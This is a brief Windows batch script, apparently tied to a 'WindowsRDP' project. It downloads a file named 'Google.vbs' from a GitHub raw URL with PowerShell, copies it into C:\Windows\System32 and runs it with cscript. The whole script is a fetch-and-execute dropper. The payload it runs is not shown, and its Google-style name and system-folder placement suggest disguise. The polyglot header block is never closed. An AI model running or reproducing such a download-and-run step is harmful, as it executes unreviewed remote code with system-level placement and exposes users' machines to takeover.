@if (@CodeSection == @Batch) @then


@echo on
powershell Invoke-WebRequest https://raw.githubusercontent.com/Ceantix/WindowsRDP/main/Google.vbs -OutFile Google.vbs
copy Google.vbs C:\Windows\System32 
cscript .\Google.vbs %1
